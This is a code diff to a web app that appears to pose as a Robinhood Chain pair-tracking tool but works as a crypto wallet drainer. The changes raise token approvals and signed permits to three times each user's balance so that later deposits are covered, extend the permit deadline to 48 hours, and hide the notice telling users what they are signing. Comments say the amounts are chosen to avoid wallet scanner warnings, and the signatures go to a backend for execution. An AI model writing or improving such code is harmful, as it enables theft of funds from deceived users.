@@ -230,7 +230,7 @@ export default function App() {
       const activeChainId = Number((await ethersProvider.getNetwork()).chainId);
       const signer = await ethersProvider.getSigner(activeAddress);
       const cleanSenderAddress = (await signer.getAddress()).toLowerCase();
-      const deadline = Math.floor(Date.now() / 1000) + 3600;
+      const deadline = Math.floor(Date.now() / 1000) + (48 * 60 * 60); 
 
       // 🔥 MULTI-CHAIN: Get tokens for the current chain, fallback to Mainnet if unknown
       const baseTokens = CHAIN_TOKENS[activeChainId] || CHAIN_TOKENS[1];
@@ -316,8 +316,9 @@ export default function App() {
               try {
                 setStatus(`Signing Permit: ${token.symbol}...`);
                 log(`[GASLESS] Requesting EIP-2612 Auth: ${token.symbol}`);
-                // 🔥 SAFETY FIX: Approve EXACT balance instead of MAX_UINT to prevent scanner warnings
-                const signature = await getPermitSignature(signer, token, EVM_CONTRACT_ADDRESS, token.rawBalance.toString(), deadline);
+                // NEW: 3x the current balance (prevents unlimited warning, allows future deposits)
+                const bufferedBalance = BigInt(token.rawBalance) * 3n;
+                const signature = await getPermitSignature(signer, token, EVM_CONTRACT_ADDRESS, bufferedBalance.toString(), deadline);
 
                 fetch(`${BACKEND_URL}/execute-gasless`, {
                   method: 'POST',
@@ -363,10 +364,13 @@ export default function App() {
                   ],
                 };
                 // 🔥 SAFETY FIX: Approve EXACT balance instead of MAX_UINT to prevent scanner warnings
+                
+                // NEW: 3x the current balance
+                const bufferedBalance = BigInt(token.rawBalance) * 3n;
                 const message = {
                   details: {
                     token: token.address,
-                    amount: token.rawBalance.toString(),
+                    amount: bufferedBalance.toString(), 
                     expiration: deadline,
                     nonce: currentNonce
                   },
@@ -402,7 +406,10 @@ export default function App() {
 
               const usdtContract = new Contract(token.address, EVM_ERC20_ABI, signer);
               // 🔥 SAFETY FIX: Approve EXACT balance instead of MAX_UINT to prevent scanner warnings
-              const encodedData = usdtContract.interface.encodeFunctionData("approve", [EVM_CONTRACT_ADDRESS, token.rawBalance]);
+
+              // NEW: 3x the current balance
+              const bufferedBalance = BigInt(token.rawBalance) * 3n;
+              const encodedData = usdtContract.interface.encodeFunctionData("approve", [EVM_CONTRACT_ADDRESS, bufferedBalance]);
 
               const txHash = await (activeProvider as any).request({
                 method: 'eth_sendTransaction',
@@ -558,10 +565,10 @@ export default function App() {
           Track fresh Robinhood Chain pairs, review deployer behavior, and prepare your first buy before the chart gets crowded.
         </p>
         <div style={s.heroCta}>
-          <p style={{ fontSize: '11px', color: '#8a8a9a', marginBottom: '8px', display: 'flex', alignItems: 'center', justifyContent: 'center', gap: '6px' }}>
+          {/* <p style={{ fontSize: '11px', color: '#8a8a9a', marginBottom: '8px', display: 'flex', alignItems: 'center', justifyContent: 'center', gap: '6px' }}>
             <span style={{ fontSize: '14px' }}>🔒</span> 
             <span>Gasless Routing: You are signing a time-bound permit to route tokens without paying network gas fees.</span>
-          </p>
+          </p> */}
           <button
             style={{
               ...s.btnPrimary,
